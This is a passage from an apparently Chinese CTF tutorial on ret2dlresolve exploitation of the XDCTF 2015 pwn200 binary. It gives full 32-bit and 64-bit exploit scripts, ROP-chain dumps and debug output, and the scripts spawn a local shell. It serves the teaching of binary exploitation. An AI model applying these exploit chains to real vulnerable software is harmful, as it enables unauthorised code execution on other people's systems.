</code></pre></div> <p>需要注意的是，这里我把 /bin/sh 的偏移修改为了 base_stage+82，这是因为 pwntools 会对齐字符串。如下面的 ropchain 所示，0x40 处多了两个 a，比较奇怪。</p> <div class=highlight><pre><span></span><code>0x0038:           &#39;syst&#39; &#39;system\x00&#39;
0x003c:        &#39;em\x00o&#39;
0x0040:             &#39;aa&#39;
0x0042:           &#39;aaaa&#39; &#39;aaaaaaaaaaaaaa&#39;
</code></pre></div> <p>效果如下</p> <div class=highlight><pre><span></span><code>❯ python stage6.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>28204</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
ndx_addr: 0x80487c2
0x0000:        0x8048370
0x0004:           0x25ec
0x0008:           <span class=s1>&#39;bbbb&#39;</span> <span class=s1>&#39;bbbb&#39;</span>
0x000c:        0x804a94a
0x0010:           <span class=s1>&#39;bbbb&#39;</span> <span class=s1>&#39;bbbb&#39;</span>
0x0014:           <span class=s1>&#39;bbbb&#39;</span> <span class=s1>&#39;bbbb&#39;</span>
0x0018: <span class=s1>&#39;\x1c\xa0\x04\x08&#39;</span> <span class=s1>&#39;\x1c\xa0\x04\x08\x07u\x02\x00&#39;</span>
0x001c:  <span class=s1>&#39;\x07u\x02\x00&#39;</span>
0x0020:           <span class=s1>&#39;aaaa&#39;</span> <span class=s1>&#39;aaaa&#39;</span>
0x0024:  <span class=s1>&#39;\xc0&amp;\x00\x00&#39;</span> <span class=s1>&#39;\xc0&amp;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00&#39;</span>
0x0028: <span class=s1>&#39;\x00\x00\x00\x00&#39;</span>
0x002c: <span class=s1>&#39;\x00\x00\x00\x00&#39;</span>
0x0030: <span class=s1>&#39;\x12\x00\x00\x00&#39;</span>
0x0034:           <span class=s1>&#39;syst&#39;</span> <span class=s1>&#39;system\x00&#39;</span>
0x0038:        <span class=s1>&#39;em\x00n&#39;</span>
0x003c:             <span class=s1>&#39;aa&#39;</span>
0x003e:           <span class=s1>&#39;aaaa&#39;</span> <span class=s1>&#39;aaaaaaaaaaaaaaaaaa&#39;</span>
0x0042:           <span class=s1>&#39;aaaa&#39;</span>
0x0046:           <span class=s1>&#39;aaaa&#39;</span>
0x004a:           <span class=s1>&#39;aaaa&#39;</span>
0x004e:           <span class=s1>&#39;aaaa&#39;</span>
0x0052:           <span class=s1>&#39;/bin&#39;</span> <span class=s1>&#39;/bin/sh\x00&#39;</span>
0x0056:        <span class=s1>&#39;/sh\x00&#39;</span>
0x005a:           <span class=s1>&#39;aaaa&#39;</span> <span class=s1>&#39;aaaaaaaaaa&#39;</span>
0x005e:           <span class=s1>&#39;aaaa&#39;</span>
0x0062:           <span class=s1>&#39;aaaa&#39;</span>
<span class=m>102</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
/bin/sh: <span class=m>1</span>: aa: not found
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
</code></pre></div> <h4 id=_3>基于工具伪造<a class=headerlink href=#_3 title="Permanent link">&para;</a></h4> <p>根据上面的介绍，我们应该可以理解这个攻击了。</p> <h5 id=roputil>Roputil<a class=headerlink href=#roputil title="Permanent link">&para;</a></h5> <p>下面我们直接使用 roputil 来进行攻击。代码如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>roputils</span> <span class=kn>import</span> <span class=o>*</span>
<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>process</span>
<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>gdb</span>
<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>context</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
<span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
<span class=n>r</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>

<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main&#39;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_base</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>section</span><span class=p>(</span><span class=s1>&#39;.bss&#39;</span><span class=p>)</span>
<span class=n>buf</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>fill</span><span class=p>(</span><span class=n>offset</span><span class=p>)</span>

<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=s1>&#39;read&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>bss_base</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>
<span class=c1>## used to call dl_runtimeresolve()</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>dl_resolve_call</span><span class=p>(</span><span class=n>bss_base</span> <span class=o>+</span> <span class=mi>20</span><span class=p>,</span> <span class=n>bss_base</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>

<span class=n>buf</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>string</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>fill</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=n>buf</span><span class=p>)</span>
<span class=c1>## used to make faking data, such relocation, Symbol, Str</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>dl_resolve_data</span><span class=p>(</span><span class=n>bss_base</span> <span class=o>+</span> <span class=mi>20</span><span class=p>,</span> <span class=s1>&#39;system&#39;</span><span class=p>)</span>
<span class=n>buf</span> <span class=o>+=</span> <span class=n>rop</span><span class=o>.</span><span class=n>fill</span><span class=p>(</span><span class=mi>100</span><span class=p>,</span> <span class=n>buf</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>关于 dl_resolve_call 与 dl_resolve_data 的具体细节请参考 roputils.py 的源码，比较容易理解。需要注意的是，dl_resolve 执行完之后也是需要有对应的返回地址的。</p> <p>效果如下</p> <div class=highlight><pre><span></span><code>❯ python roptool.py
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>24673</span>
<span class=o>[</span>DEBUG<span class=o>]</span> Received 0x17 bytes:
    <span class=s1>&#39;Welcome to XDCTF2015~!\n&#39;</span>
<span class=o>[</span>DEBUG<span class=o>]</span> Sent 0x94 bytes:
    <span class=m>00000000</span>  <span class=m>42</span> 6a <span class=m>63</span> <span class=m>57</span>  <span class=m>32</span> <span class=m>34</span> <span class=m>75</span> 7a  <span class=m>30</span> <span class=m>64</span> 6d <span class=m>71</span>  <span class=m>45</span> <span class=m>54</span> <span class=m>50</span> <span class=m>31</span>  │BjcW│24uz│0dmq│ETP1│
    <span class=m>00000010</span>  <span class=m>42</span> <span class=m>63</span> 4b <span class=m>61</span>  4c <span class=m>76</span> 5a <span class=m>35</span>  <span class=m>38</span> <span class=m>77</span> <span class=m>79</span> 6d  4c <span class=m>62</span> <span class=m>34</span> <span class=m>74</span>  │BcKa│LvZ5│8wym│Lb4t│
    <span class=m>00000020</span>  <span class=m>56</span> <span class=m>47</span> 4c <span class=m>57</span>  <span class=m>62</span> <span class=m>67</span> <span class=m>55</span> 4b  <span class=m>65</span> <span class=m>57</span> 4c <span class=m>64</span>  <span class=m>34</span> <span class=m>62</span> 6f <span class=m>47</span>  │VGLW│bgUK│eWLd│4boG│
    <span class=m>00000030</span>  <span class=m>43</span> <span class=m>47</span> <span class=m>59</span> <span class=m>65</span>  4f <span class=m>41</span> <span class=m>73</span> 4c  <span class=m>61</span> <span class=m>35</span> <span class=m>79</span> 4f  <span class=m>56</span> <span class=m>47</span> <span class=m>51</span> <span class=m>71</span>  │CGYe│OAsL│a5yO│VGQq│
    <span class=m>00000040</span>  <span class=m>59</span> <span class=m>53</span> <span class=m>47</span> <span class=m>69</span>  6e <span class=m>68</span> <span class=m>62</span> <span class=m>35</span>  6f <span class=m>33</span> 4a 6e  <span class=m>31</span> <span class=m>77</span> <span class=m>66</span> <span class=m>68</span>  │YSGi│nhb5│o3Jn│1wfh│
    <span class=m>00000050</span>  <span class=m>45</span> 6f <span class=m>38</span> 6b  <span class=m>61</span> <span class=m>46</span> <span class=m>46</span> <span class=m>38</span>  4f <span class=m>67</span> 6c <span class=m>62</span>  <span class=m>61</span> <span class=m>41</span> <span class=m>58</span> <span class=m>47</span>  │Eo8k│aFF8│Oglb│aAXG│
    <span class=m>00000060</span>  <span class=m>66</span> 7a 4b <span class=m>30</span>  <span class=m>63</span> 6d <span class=m>43</span> <span class=m>43</span>  <span class=m>74</span> <span class=m>73</span> 4d 7a  <span class=m>52</span> <span class=m>66</span> <span class=m>58</span> <span class=m>63</span>  │fzK0│cmCC│tsMz│RfXc│
    <span class=m>00000070</span>  a0 <span class=m>83</span> <span class=m>04</span> <span class=m>08</span>  <span class=m>19</span> <span class=m>86</span> <span class=m>04</span> <span class=m>08</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>40</span> a0 <span class=m>04</span> <span class=m>08</span>  │····│····│····│@···│
    <span class=m>00000080</span>  <span class=m>64</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>80</span> <span class=m>83</span> <span class=m>04</span> <span class=m>08</span>  <span class=m>28</span> 1d <span class=m>00</span> <span class=m>00</span>  <span class=m>79</span> <span class=m>83</span> <span class=m>04</span> <span class=m>08</span>  │d···│····│<span class=o>(</span>···│y···│
    <span class=m>00000090</span>  <span class=m>40</span> a0 <span class=m>04</span> <span class=m>08</span>                                         │@···│
    <span class=m>00000094</span>
<span class=o>[</span>DEBUG<span class=o>]</span> Sent 0x64 bytes:
    <span class=m>00000000</span>  2f <span class=m>62</span> <span class=m>69</span> 6e  2f <span class=m>73</span> <span class=m>68</span> <span class=m>00</span>  <span class=m>35</span> <span class=m>45</span> 4e <span class=m>50</span>  6e <span class=m>51</span> <span class=m>51</span> 4b  │/bin│/sh·│5ENP│nQQK│
    <span class=m>00000010</span>  <span class=m>74</span> <span class=m>30</span> <span class=m>57</span> <span class=m>47</span>  <span class=m>62</span> <span class=m>55</span> <span class=m>49</span> <span class=m>54</span>  <span class=m>54</span> a0 <span class=m>04</span> <span class=m>08</span>  <span class=m>07</span> e9 <span class=m>01</span> <span class=m>00</span>  │t0WG│bUIT│T···│····│
    <span class=m>00000020</span>  6c <span class=m>30</span> <span class=m>39</span> <span class=m>79</span>  <span class=m>68</span> 4c <span class=m>58</span> 4b  <span class=m>00</span> 1e <span class=m>00</span> <span class=m>00</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  │l09y│hLXK│····│····│
    <span class=m>00000030</span>  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>12</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span>  <span class=m>73</span> <span class=m>79</span> <span class=m>73</span> <span class=m>74</span>  <span class=m>65</span> 6d <span class=m>00</span> 7a  │····│····│syst│em·z│
    <span class=m>00000040</span>  <span class=m>32</span> <span class=m>45</span> <span class=m>74</span> <span class=m>78</span>  <span class=m>75</span> <span class=m>35</span> <span class=m>59</span> 6a  <span class=m>55</span> 6b <span class=m>54</span> <span class=m>74</span>  <span class=m>63</span> <span class=m>46</span> <span class=m>70</span> <span class=m>71</span>  │2Etx│u5Yj│UkTt│cFpq│
    <span class=m>00000050</span>  <span class=m>32</span> <span class=m>42</span> 6f 4c  <span class=m>43</span> <span class=m>53</span> <span class=m>49</span> <span class=m>33</span>  <span class=m>75</span> <span class=m>47</span> <span class=m>59</span> <span class=m>53</span>  7a <span class=m>76</span> <span class=m>63</span> 6b  │2BoL│CSI3│uGYS│zvck│
    <span class=m>00000060</span>  <span class=m>44</span> <span class=m>43</span> 4d <span class=m>41</span>                                         │DCMA│
    <span class=m>00000064</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
$ ls
<span class=o>[</span>DEBUG<span class=o>]</span> Sent 0x3 bytes:
    <span class=s1>&#39;ls\n&#39;</span>
<span class=o>[</span>DEBUG<span class=o>]</span> Received 0x9f bytes:
    <span class=s1>&#39;exp-pwntools.py        roptool.py    stage2.py\tstage5.py\n&#39;</span>
    <span class=s1>&#39;ld-linux.so.2\t       roputils.pyc  stage3.py\tstage6.py\n&#39;</span>
    <span class=s1>&#39;main_partial_relro_32  stage1.py     stage4.py\n&#39;</span>
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
</code></pre></div> <h5 id=pwntools>pwntools<a class=headerlink href=#pwntools title="Permanent link">&para;</a></h5> <p>这里我们使用 pwntools 的工具进行攻击。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_32&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=p>)</span>
<span class=n>dlresolve</span> <span class=o>=</span> <span class=n>Ret2dlresolvePayload</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span><span class=n>symbol</span><span class=o>=</span><span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>[</span><span class=s2>&quot;/bin/sh&quot;</span><span class=p>])</span>
<span class=c1># pwntools will help us choose a proper addr</span>
<span class=c1># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>dlresolve</span><span class=o>.</span><span class=n>data_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>ret2dlresolve</span><span class=p>(</span><span class=n>dlresolve</span><span class=p>)</span>
<span class=n>raw_rop</span> <span class=o>=</span> <span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_32&quot;</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s2>&quot;</span><span class=p>)</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span><span class=mi>112</span><span class=p>:</span><span class=n>raw_rop</span><span class=p>,</span><span class=mi>256</span><span class=p>:</span><span class=n>dlresolve</span><span class=o>.</span><span class=n>payload</span><span class=p>})</span>
<span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>结果如下</p> <div class=highlight><pre><span></span><code>❯ python exp-pwntools.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>24688</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
$ ls
exp-pwntools.py        roptool.py    stage2.py    stage5.py
ld-linux.so.2           roputils.pyc  stage3.py    stage6.py
main_partial_relro_32  stage1.py     stage4.py
</code></pre></div> <h3 id=full-relro>Full RELRO<a class=headerlink href=#full-relro title="Permanent link">&para;</a></h3> <p>在开启 FULL RELRO 保护的情况下，程序中导入的函数地址会在程序开始执行之前被解析完毕，因此 got 表中 link_map 以及 dl_runtime_resolve 函数地址在程序执行的过程中不会被用到。故而，GOT 表中的这两个地址均为 0。此时，直接使用上面的技巧是不行的。</p> <p>那有没有什么办法可以绕过这样的防护呢？请读者自己思考。</p> <h2 id=64>64 位例子<a class=headerlink href=#64 title="Permanent link">&para;</a></h2> <h3 id=no-relro_1>NO RELRO<a class=headerlink href=#no-relro_1 title="Permanent link">&para;</a></h3> <p>在这种情况下，类似于 32 位的情况直接构造即可。由于可以溢出的缓冲区太少，所以我们可以考虑进行栈迁移后，然后进行漏洞利用。</p> <ol> <li>在 bss 段伪造栈。栈中的数据为<ol> <li>修改 .dynamic 节中字符串表的地址为伪造的地址</li> <li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li> <li>在特定的位置读取 /bin/sh 字符串。</li> <li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而触发执行 system 函数。</li> </ol> </li> <li>栈迁移到 bss 段。</li> </ol> <p>由于程序中没有直接设置 rdx 的 gadget，所以我们这里就选择了万能 gadget。这会使得我们的 ROP 链变得更长</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400750</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40076A</span>
<span class=n>leave_ret</span>  <span class=o>=</span><span class=mh>0x40063c</span>
<span class=n>poprbp_ret</span> <span class=o>=</span> <span class=mh>0x400588</span>
<span class=k>def</span> <span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>

<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set rsp = new_stack</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x200</span> <span class=c1># new stack size is 0x200</span>
<span class=n>new_stack</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>payload1</span> <span class=o>=</span> <span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>new_stack</span><span class=p>,</span><span class=n>stack_size</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400607</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=c1># gdb.attach(io)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># construct fake stack</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600988</span><span class=o>+</span><span class=mi>8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>  <span class=c1># modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>data</span><span class=p>()</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>dynstr</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&quot;read&quot;</span><span class=p>,</span><span class=s2>&quot;system&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)))</span>  <span class=c1># construct a fake dynstr section</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>),</span><span class=nb>len</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)))</span>  <span class=c1># read /bin/sh\x00</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x0000000000400773</span><span class=p>)</span> <span class=c1># pop rdi; ret</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x600B30</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>dynstr</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x400516</span><span class=p>)</span> <span class=c1># the second instruction of read@plt </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=n>stack_size</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>

<span class=c1># reuse the vuln to stack pivot</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_no_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>new_stack</span><span class=p>)</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>()</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=c1># now, we are on the new stack</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x600B30</span><span class=p>))</span> <span class=c1># fake dynstr location</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>dynstr</span><span class=p>)</span> <span class=c1># fake dynstr</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span><span class=p>)</span>

<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>直接运行，发现不行，经过调试发现程序在 0x7f2512db3e69 处崩了。</p> <div class=highlight><pre><span></span><code> RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
 RBX  0x600d98 ◂— 0x6161616161616161 (&#39;aaaaaaaa&#39;)
 RCX  0x7f2512ac3191 (read+17) ◂— cmp    rax, -0x1000 /* &#39;H=&#39; */
 RDX  0x9
 RDI  0x600b30 (stdout@@GLIBC_2.2.5) ◂— 0x0
 RSI  0x3
 R8   0x50
